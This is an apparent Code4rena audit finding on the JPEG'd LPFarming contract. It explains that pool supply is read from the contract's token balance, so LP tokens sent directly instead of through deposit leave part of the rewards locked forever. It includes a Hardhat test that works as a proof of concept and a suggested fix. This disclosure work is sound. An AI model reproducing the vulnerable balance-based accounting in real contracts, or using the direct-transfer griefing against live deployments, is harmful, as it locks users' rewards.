## Tags

- bug
- 2 (Med Risk)
- disagree with severity
- resolved
- sponsor confirmed

# [rewards will be locked if user transfer directly to pool without using deposit function ](https://github.com/code-423n4/2022-04-jpegd-findings/issues/19) 

# Lines of code

https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L190


# Vulnerability details

## Impact
###### LpFarming.sol
reward will be locked in the farming, when user execute a direct transfer with lpToken to farm without using deposit  

## Proof of Concept
"pls add this test to LpFarming.ts to check" 

```
it("a part of rewards can't be distributed if user execute a direct transfer to farm", async() => {
      // manual mine new block  
      await network.provider.send("evm_setAutomine", [false]);

      // prepare 
      const attacker = bob;
      await lpTokens[0].transfer(alice.address, units(1000));
      await lpTokens[0].transfer(attacker.address, units(1000));
      await lpTokens[0].connect(alice).approve(farming.address, units(1000));
      await mineBlocks(1);

      // attacker direct deposit lp token to the pool 
      await lpTokens[0].connect(attacker).transfer(farming.address, units(100));

      // create new pool
      await farming.add(10, lpTokens[0].address);
      await mineBlocks(1);
      expect(await farming.poolLength()).to.equal(1);

      let pool = await farming.poolInfo(0);
      expect(pool.lpToken).to.equal(lpTokens[0].address);
      expect(pool.allocPoint).to.equal(10);

      // create new epoch ==> balance of pool will be 1000 
      let blockNumber = await ethers.provider.getBlockNumber();
      await farming.newEpoch(blockNumber + 1, blockNumber + 11, 100);

      // alice deposit 
      await farming.connect(alice).deposit(0, units(100));
      await mineBlocks(1);

      expect(await jpeg.balanceOf(farming.address)).to.equal(1000);

      // when pool end, alice can just take 500 jpeg, and 500 jpeg will be locked in the contract forever !!!
      await mineBlocks(13);
      console.log("reward of alice: ", (await   farming.pendingReward(0, alice.address)).toString());
      expect(await farming.pendingReward(0, alice.address)).to.equal(BigNumber.from('500'));
    });
```
In the test above, the attacker transfers 100 lpToken to the farm without using deposit function, and alice deposit 100 lpToken. Because the contract uses ```pool.lpToken.balanceOf(address(this))``` to get the total supply of lpToken in the pool, it will sum up 100 lpToken of attacker and 100 lpToken of alice. This will lead to the situation where Alice will only be able to claim 500 token (at epoch.endBlock), the rest will be locked in the pool forever. Not only with this pool, it also affects the following, a part of the reward will be locked in the pool when the farm end.

## Tools Used
typescript 

## Recommended Mitigation Steps
Declare a new variable ```totalLPSupply``` to the struct ```PoolInfo```, and use it instead of ```pool.lpToken.balanceOf(address(this))```


